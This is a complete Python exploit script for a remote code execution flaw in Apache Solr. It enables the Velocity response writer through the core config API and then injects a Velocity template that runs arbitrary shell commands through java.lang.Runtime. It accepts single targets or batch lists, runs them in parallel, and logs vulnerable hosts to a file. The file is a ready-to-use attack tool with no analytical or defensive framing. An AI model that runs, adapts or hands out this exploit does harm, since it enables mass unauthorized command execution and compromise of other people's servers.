import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool
import warnings
import optparse
import os

warnings.filterwarnings("ignore")


class RCE(object):
    def __init__(self):
        self.path=["/solr/admin/cores","/solr/{path}/config","/solr/{path}/select"]
        self.enable={
          "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
            }
        }
        self.data='''q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{command}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"'''
        self.header={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"}
        self.timeout=3
        self.check="echo RaidEnMei"
        self.outcommand=0

    def send(self,url):
        getname="{}{}".format(url.rstrip("/"),self.path[0])
        try:
            rqt=requests.get(getname,headers=self.header,timeout=self.timeout,verify=False)
            if "application/xml" in rqt.headers["Content-Type"]:
                xml=BeautifulSoup(rqt.text,"lxml")
                name_=xml.find("str").get("name")
            else:
                jsondata=rqt.json()
                name_=jsondata["status"]
                name_=list(name_.keys())[0]

            if self.outcommand==0:
                pathurl = "{}{}".format(url.rstrip("/"), self.path[1].format(path=name_))
                enable = requests.post(pathurl, headers=self.header, data=self.enable, timeout=self.timeout, verify=False)
                jsondata = enable.json()
                if jsondata["responseHeader"]["status"] == 0:
                    print("[*] Enable Sucess")
                else:
                    print("[-] Enable Failure")

            rceurl = "{}{}".format(url.rstrip("/"), self.path[2].format(path=name_))
            self.header["Content-Type"]="application/x-www-form-urlencoded"
            rce=requests.post(url=rceurl,headers=self.header,data=self.data.format(command=self.check.format(command=self.check)),verify=False)
            if self.outcommand==0:
                if "RaidEnMei" in rce.text and int(rce.text[0:3])==0:
                    print("[+] solr RCE url:{}".format(url))
                    print("[+] solr RCE url:{}".format(url),file=open("solr_rce.txt","a",encoding="utf-8"))
                else:
                    print("[-] Not Found RCE url:{}".format(url))
            else:
                print("[+] Run Command Out the url:{}".format(url))
                print(rce.text)
        except Exception as error:
            pass

if __name__ == '__main__':
    obj=RCE()
    parser=optparse.OptionParser()
    parser.add_option('-u',dest="url",help="检测的url")
    parser.add_option("-f",dest="file",help="批量检测的文件")
    parser.add_option("-c",dest="cmd",help="要执行的命令")
    option,args=parser.parse_args()
    if option.url or (option.url and option.cmd):
        if option.cmd:
            obj.outcommand = 1
            obj.check=option.cmd
        obj.send(option.url)
        print("[SAVE] found solr RCE solr_rce.txt")
    elif option.file or (option.file and option.cmd):
        print(option.file)
        if os.path.exists(option.file):
            if option.cmd:
                obj.outcommand = 1
                obj.check = option.cmd
            print("[*] reading file:{}".format(option.file))
            urllist=open(option.file,"r",encoding="utf-8").read().split("\n")
            p=Pool()
            p.map(obj.send,urllist)
            print("[SAVE] found solr RCE solr_rce.txt")
        else:
            print("[-] not found file:{}".format(option.file))
    else:
        print('''Example:
        python exploit.py -u <url> #单个检测
        python exploit.py -f <file> #批量检测
        python exploit.py -f url.txt -c "whoami" #批量执行命令
        python exploit.py -u <url> -c "whoami" #单个执行命令
        ''')
        parser.print_help()